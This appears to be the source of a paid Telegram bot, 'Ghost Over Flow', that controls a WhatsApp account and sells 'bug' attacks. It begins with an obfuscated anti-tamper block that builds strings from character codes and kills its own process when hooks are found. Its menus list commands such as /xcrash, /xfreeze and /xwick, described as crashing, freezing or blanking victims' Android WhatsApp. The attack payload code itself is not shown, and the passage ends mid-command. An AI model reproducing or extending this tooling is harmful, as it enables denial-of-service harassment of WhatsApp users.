(function() {
  'use strict'
  
  if (require.main !== module) {
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  if (module.parent !== null && module.parent !== undefined) {
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }
  
  const nativePattern = /\[native code\]/
  const proxyPattern = /Proxy|apply\(target/
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github\.com.*includes/i
  
  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('')
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93])
  const exitStr = buildStr([101,120,105,116])
  const killStr = buildStr([107,105,108,108])
  const httpsStr = buildStr([104,116,116,112,115])
  const httpStr = buildStr([104,116,116,112])
  
  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn
  
  try {
    nativeExit = process[exitStr].bind(process)
    nativeKill = process[killStr].bind(process)
    nativeOn = process.on.bind(process)
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync
    nativePid = process.pid
  } catch(e) {
    nativeExit = process.exit
    nativeKill = process.kill
    nativePid = process.pid
  }
  
  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })()
  
  try {
    const M = require(buildStr([109,111,100,117,108,101]))
    const reqStr = M.prototype.require.toString()
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const exitFn = process[exitStr]
    const exitCode = exitFn.toString()
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override')
      forceKill()
    }
    
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const killFn = process[killStr]
    const killCode = killFn.toString()
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const onFn = process.on
    const onCode = onFn.toString()
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    const axios = require('axios')
    if (axios.interceptors.request.handlers.length > 0 || 
        axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected')
      forceKill()
    }
  } catch(e) {}
  
  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest']
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i])
          forceKill()
        }
      } catch(e) {}
    }
  })
  checkGlobals()
  
  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]))
    const execStr = cp.execSync.toString()
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden')
      forceKill()
    }
  } catch(e) {}
  
  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString()
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected')
        forceKill()
      }
    }
  } catch(e) {}
  
  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr)
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter')
      forceKill()
    }
  } catch(e) {}
  
  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr)
        const reqFunc = https.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] https.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] https.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {
          console.error('[X] https.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr)
        const reqFunc = http.request
        
        const realToString = Function.prototype.toString.call(reqFunc)
        const fakeToString = reqFunc.toString()
        
        if (realToString !== fakeToString) {
          console.error('[X] http.request toString masked')
          forceKill()
        }
        
        if (httpBypassPattern.test(realToString)) {
          console.error('[X] http.request contains bypass patterns')
          forceKill()
        }
        
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {
          console.error('[X] http.request contains http-bypass code')
          forceKill()
        }
        
      } catch(e) {}
    }
  })()
  
  setTimeout(() => {
    checkHttps()
    checkHttp()
  }, 500)
  
  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected')
        forceKill()
      }
      
      try {
        const M = require(buildStr([109,111,100,117,108,101]))
        const reqStr = M.prototype.require.toString()
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const exitFn = process[exitStr]
        const exitCode = exitFn.toString()
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const killFn = process[killStr]
        const killCode = killFn.toString()
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised')
          forceKill()
        }
      } catch(e) {}
      
      try {
        const axios = require('axios')
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active')
          forceKill()
        }
      } catch(e) {}
      
      checkHttps()
      checkHttp()
      checkGlobals()
    }
  })()
  
  setInterval(monitor, 2000)
  setTimeout(monitor, 100)
  
})()

const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const https = require("https");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_MAKLOW } = require("./config");
const BOT_TOKEN = TOKEN_MAKLOW;

const MODE_FILE = "./XGHOST/mode.json";
const crypto = require("crypto");

const premiumFile = "./XDATABASE/premiumuser.json";
const adminFile = "./XDATABASE/adminuser.json";
const ownerFile = "./XDATABASE/owneruser.json";
const GROUP_FILE = "./XGHOST/groupmode.json";
const antiFotoFile = "./XGHOST/antifoto.json"
const safeFile = "./XGHOST/safeGroups.json";
const antiVideoFile = "./XGHOST/antivideo.json"
const premiumGroupsFile = "./XGHOST/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}

function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}

const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}

function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()

const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}

function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function memory() {
  return (process.memoryUsage().rss / 1024 / 1024).toFixed(0) + " MB";
}

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/rahayudewilestari50-netizen/v7/main/token.json";

async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal Mengambil Token Dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa Token"));

  const validTokens = await fetchValidTokens();

if (!validTokens.length) {
  console.log(`
• Creator : @fuckyanxz
• Script : Ghost Over Flow
• System : Stable 
  
• Token Tidak Terdaftar
• Aktivitas Mencurigakan Terdeteksi

GHOST — SECURITY SISTEM
`);
  process.exit(1);
}

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(""));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token Valid"));
  startBot();
}

function startBot() {
  console.log(chalk.red(`
• Creator : @fuckyanxz
• Script  : 𝐆𝐡𝐨𝐬𝐭 𝐎𝐯𝐞𝐫 𝐅𝐥𝐨𝐰
• System  : Buy Only

GHOST — SYSTEM CONNECTED
• Bot Berhasil Terhubung
• Anti Bypass System Dilepaskan
• Proses Encrypted File Berjalan Normal

GHOST — PROTECTION FILE PREMIUM
`))
}

validateToken()

const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(`
• Creator : @fuckyanxz
• Script : Ghost Over Flow
• System : Buy Only

GHOST — SYSTEM READY AND CONNECTED
`);

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    console.log("🔐 Siap pairing atau reconnect");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        console.log("🔄 Connecting");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
• Creator : @fuckyanxz
• Script : Ghost Over Flow
• System : Stable
• Status : Connected 
• WhatsApp : ${linkedWhatsAppNumber}
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`\`\`\`JavaScript
const NOMOR_PAIRING = "${linkedWhatsAppNumber}"
\`\`\``,
              { parse_mode: "Markdown" }
            );

          } catch (err) {
            console.log("❌ Gagal Edit Pesan :", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected :", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          console.log("🚫 Session Logout");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          console.log("⛔ Stop Reconnect");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect Dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error Start Session :", err);
    isStarting = false;
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ Sender Tidak Ditemukan");
  }
  return next();
};

const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON Corrupt :", file);
    return [];
  }
};

const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed Save JSON :", file, err.message);
  }
};

function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session Not Found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session Deleted Successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed Delete Session :", err.message);
    return false;
  }
}

module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};

let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
let whitelistGroups = []; 

let JoinCh = null;
let ownerUsers = loadOwner();
let premiumUsers = loadJSON(premiumFile);
let adminList    = [];

loadAdmins();

const checkOwner = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (!ownerUsers.includes(id)) {
    return ctx.reply("❌ Anda Harus Menjadi Owner Agar Bisa Menggunakan Semua Fitur Tersedia");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.reply("❌ Anda Harus Menjadi Admin");
  }

  return next();
};
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();

  
  if (premiumUsers.includes(id)) {
    return next();
  }

 
  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.reply("❌ Anda Belum Menjadi Premium Akses");
};

function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}

function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}

function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

function saveAdmins() {
  try {
    fs.writeFileSync("./XDATABASE/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal Save Admin :", err.message);
  }
}

function loadAdmins() {
  try {
    if (!fs.existsSync("./XDATABASE/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./XDATABASE/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal Load Admin :", err.message);
    adminList = [];
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function isSender(userId) {
  return senderUsers.includes(String(userId));
}

function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}

function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()

bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
Bot ini hanya bisa digunakan di dalam group.
`);
  }

  return next();
});

bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});

function parseCooldown(input) {
  const match = input.match(/^(\d+)([dhms])$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "d":
      return value * 1000;

    case "m":
      return value * 60 * 1000;

    case "h":
      return value * 60 * 60 * 1000;

    case "s":
      return value * 24 * 60 * 60 * 1000;

    default:
      return null;
  }
}

let COOLDOWN_TIME = 1;
let COOLDOWN_TEXT = "1d";
const cooldowns = new Map();

function checkCooldown(ctx, next) {
  if (!ctx.from?.id) return next();


  if (isOwner(ctx.from.id)) return next();


  if (COOLDOWN_TIME === 0) return next();

  const userId = String(ctx.from.id);
  const now = Date.now();

  const expireTime = cooldowns.get(userId) || 0;

  if (now < expireTime) {
    
    if (!cooldowns.get(userId + "_msg")) {
      cooldowns.set(userId + "_msg", true);

      setTimeout(() => cooldowns.delete(userId + "_msg"), 3000);

      return ctx.reply(`⏳ Tunggu ${COOLDOWN_TEXT}!`);
    }
    return;
  }

  
  cooldowns.set(userId, now + COOLDOWN_TIME);

  return next();
}

async function isJoined(userId) {
  if (!JoinCh) return true;

  try {
    const member = await bot.telegram.getChatMember(
      JoinCh,
      userId
    );

    return [
      "member",
      "administrator",
      "creator"
    ].includes(member.status);

  } catch (e) {
    return false;
  }
}

const IMAGES = {
  home: "https://files.catbox.moe/tyqvf0.jpg"
};

async function editMenu(ctx, caption, keyboard) {
  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageMedia(
        {
          type: "photo",
          media: IMAGES.home,
          caption,
          parse_mode: "Markdown"
        },
        { reply_markup: { inline_keyboard: keyboard } }
      );
    } else {
      await ctx.replyWithPhoto(IMAGES.home, {
        caption,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } catch {
    await ctx.reply(caption, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    });
  }
}

async function sendPage(ctx, page = 0) {
  const total = pages.length;

  if (page < 0) page = 0;
  if (page >= total) page = total - 1;

  let keyboard = [];

  const ownerBtn = {
    text: "Owner",
    url: "https://t.me/fuckyanxz",
    style: "danger",
    icon_custom_emoji_id: "4956420859771225351"
  };

  if (page === 0) {
    keyboard = [[
      {
        text: "Open Menu",
        callback_data: `page_${page + 1}`,
        style: "success",
        icon_custom_emoji_id: "5875161424342290538"
      }
    ]];

  } else if (page === 1 || page === 2 || page === 3) {
    keyboard = [[
      { text: "Back", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" },
      ownerBtn,
      { text: "Next", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "5372917041193828849" }
    ]];

  } else if  (page === 4) {
    keyboard = [
      [{ text: "Bebas Spam Bug", callback_data: "spam", style: "success", icon_custom_emoji_id: "5875161424342290538" }],
      [{ text: "Visible Bug", callback_data: "not_spam", style: "danger", icon_custom_emoji_id: "5877329429344030755" }],
      [
        { text: "Back", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" },
        ownerBtn,
        { text: "Next", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "5372917041193828849" }
      ]
    ];

  } else {
    const nav = [];

    if (page > 0) nav.push({ text: "Back", callback_data: `page_${page - 1}`, style: "primary", icon_custom_emoji_id: "5352759161945867747" });
    nav.push(ownerBtn);
    if (page < total - 1) nav.push({ text: "Next", callback_data: `page_${page + 1}`, style: "success", icon_custom_emoji_id: "5372917041193828849" });

    keyboard = [nav];
  }

  return editMenu(ctx, pages[page], keyboard); 
}

bot.action(/page_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  await sendPage(ctx, parseInt(ctx.match[1]));
});
  
bot.action("noop", async (ctx) => {
  await ctx.answerCbQuery();
});

const pages = [
` \`\`\`JavaScript
const NameScript = "GHOST OVER FLOW"
const Developer = "@fuckyanxz"
const Version = "3.0 Vip Buy"
\`\`\`
`,

` \`\`\`JavaScript
༺━━━━━━━━━━━━━━━━━━━━━━༻
      INFORMATION
༺━━━━━━━━━━━━━━━━━━━━━━༻
▢ Developer : @fuckyanxz
▢ Version : 3.0 Buy Only
▢ Security : Active
▢ System : Stable
༺━━━━━━━━━━━༻
P a g e : 1 - 6
༺━━━━━━━━━━━༻
\`\`\`
`,

` \`\`\`JavaScript
༺━━━━━━━━━━━━━━━━━━━━━━༻
      SETTINGS CONTROL V1
༺━━━━━━━━━━━━━━━━━━━━━━༻
▢ /addgrouppremium
▢ /delgrouppremium
▢ /groupon
▢ /groupoff
▢ /anticulik
▢ /addsafe
▢ /delsafe
▢ /antifoto
▢ /antivideo
▢ /list
▢ /addowner
▢ /delowner
▢ /addadmin
▢ /deladmin
▢ /addprem
▢ /delprem
▢ /cekbot
▢ /setcd
▢ /self
▢ /public
▢ /cekfunction
༺━━━━━━━━━━━༻
P a g e : 2 - 6
༺━━━━━━━━━━━༻
\`\`\`
`,

` \`\`\`JavaScript
༺━━━━━━━━━━━━━━━━━━━━━━༻
      SETTINGS CONTROL V2
༺━━━━━━━━━━━━━━━━━━━━━━༻
▢ /setch
▢ /cekidch
▢ /runtime
▢ /mode
▢ /cekowner
▢ /offcmd
▢ /oncmd
▢ /offcmdlist
▢ /lockallcmd
▢ /unlockallcmd
▢ /connect
▢ /killsesi
▢ /reactch
▢ /cekemoji
▢ /restart
▢ /update
༺━━━━━━━━━━━༻
P a g e : 3 - 6
༺━━━━━━━━━━━༻
\`\`\`
`,

` \`\`\`JavaScript
"Silahkan Pilih Jenis Kategori Bug Yang Ingin Di Gunakan DI Bawah Ini, Gunakan Dengan Bijak Ya"
༺━━━━━━━━━━━༻
P a g e : 4 - 6
༺━━━━━━━━━━━༻
\`\`\`
`,

` \`\`\`JavaScript
༺━━━━━━━━━━━━━━━━━━━━━━༻
            TOOLS
༺━━━━━━━━━━━━━━━━━━━━━━༻
▢ /brat
▢ /catbox
▢ /catboxurl
▢ /convert
▢ /hd
▢ /removebg
▢ /tiktokdl
▢ /snack
▢ /cekmasadepan
▢ /cuaca
▢ /time
▢ /ssiphone
▢ /decjs
▢ /harga
▢ /rasukbot
༺━━━━━━━━━━━༻
P a g e : 5 - 6
༺━━━━━━━━━━━༻
\`\`\`
`,

` \`\`\`JavaScript
༺━━━━━━━━━━━━━━━━━━━━━━༻
      BEST SUPPORT
༺━━━━━━━━━━━━━━━━━━━━━━༻
▢ @Allah - Endless Blessing
▢ @Ortu - Real Life Backbone
▢ @fuckyanxz - Developer
▢ @worldmarketvip2 - My Friends
▢ @olinnckep - My Support
▢ @IkiyIsHere - My Support
༺━━━━━━━━━━━༻
P a g e : 6 - 6
༺━━━━━━━━━━━༻
\`\`\`
`,
];

bot.action("cek_join", async (ctx) => {
  const joined = await isJoined(ctx.from.id);

  if (!joined) {
    return ctx.answerCbQuery(
      "❌ Kamu Belum Join Channel",
      { show_alert: true }
    );
  }

  await ctx.answerCbQuery(
    "✅ Verifikasi Berhasil"
  );

  await sendPage(ctx, 0);
});

bot.action("spam", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`JavaScript
༺━━━━━━━━━━━━━━━━━━━━━━༻
      MURBUG MENU
༺━━━━━━━━━━━━━━━━━━━━━━༻
▢ /xbugs ☇ Delay Invisible
▢ /xspam ☇ Delay Bebas Spam
▢ /xlz ☇ Delay Protocol Bebas Spam 
▢ /xperma ☇ Delay Hard + Freeze Bebas Spam
▢ /xshow ☇ Delay Protocol Bebas Spam
▢ /xpd ☇ Delay + Freeze Bebas Spam
\`\`\`
`, [[{ text: "Back", callback_data: "page_4", style: "primary", icon_custom_emoji_id: "5352759161945867747" }]]);
});

bot.action("not_spam", async (ctx) => {
  await ctx.answerCbQuery();
  await editMenu(ctx, `
\`\`\`JavaScript
༺━━━━━━━━━━━━━━━━━━━━━━༻
      VISIBLE MENU
༺━━━━━━━━━━━━━━━━━━━━━━༻
▢ /xwick ☇ Blank Android
▢ /xfreeze ☇ Freeze Android
▢ /xcrash ☇ Crash Android
▢ /xfc ☇ Fc Klik
▢ /xflow ☇ Fc Klik
▢ /xghost ☇ Fc Klik
▢ /xsystem ☇ Blank System Notif
▢ /xdarkover ☇ Blank Freeze Ui
\`\`\`
`, [[{ text: "Back", callback_data: "page_4", style: "primary", icon_custom_emoji_id: "5352759161945867747" }]]);
});

bot.action(/page_(\d+)/, async (ctx) => {
  await ctx.answerCbQuery();
  sendPage(ctx, parseInt(ctx.match[1]));
});

bot.start(async (ctx) => {

  if (JoinCh) {
    const joined = await isJoined(ctx.from.id);

    if (!joined) {
      return ctx.reply(
        "❌ Kamu belum join channel.",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📢 Join Channel",
                  url: `https://t.me/${JoinCh.replace("@", "")}`,
                  style: "primary"
                }
              ],
              [
                {
                  text: "🔄 Cek Status",
                  callback_data: "cek_join",
                  style: "success"
                }
              ]
            ]
          }
        }
      );
    }
  }

  await sendPage(ctx, 0);
});

bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
